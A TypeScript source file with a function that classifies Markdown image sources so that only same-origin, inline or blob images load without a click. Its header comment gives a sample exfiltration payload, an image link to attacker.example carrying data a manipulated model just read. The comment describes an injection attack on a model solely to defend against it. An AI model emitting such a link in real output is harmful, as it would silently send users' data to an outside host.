/**
 * Which Markdown image sources load by themselves. An <img> is fetched the
 * moment it renders, so a model that was talked into writing
 * `![](https://attacker.example/p?d=<what it just read>)` would send that
 * data out of the viewer's browser with no click. Only a source that cannot
 * leave the app loads on its own: a path on this origin, an inline image, a
 * blob the page made. Anything else waits for the viewer to ask.
 */

export type ImageSource = { trusted: true } | { trusted: false; host: string };

export function classifyImageSource(src: string | undefined | null): ImageSource {
  const value = (src ?? '').trim();
  // A single leading slash is this origin's own path; `//host/…` is another host.
  if (value.startsWith('/') && !value.startsWith('//') && !value.startsWith('/\\')) {
    return { trusted: true };
  }
  if (/^data:image\//i.test(value) || /^blob:/i.test(value)) return { trusted: true };
  // Only an absolute or scheme-relative source names a host; a relative
  // path (`x.png`) or nothing at all resolves against no host of its own.
  if (!/^(?:[a-z][a-z0-9+.-]*:|[/\\]{2})/i.test(value)) {
    return { trusted: false, host: 'another site' };
  }
  try {
    return {
      trusted: false,
      host: new URL(value, 'https://invalid.invalid').host || 'another site',
    };
  } catch {
    return { trusted: false, host: 'another site' };
  }
}
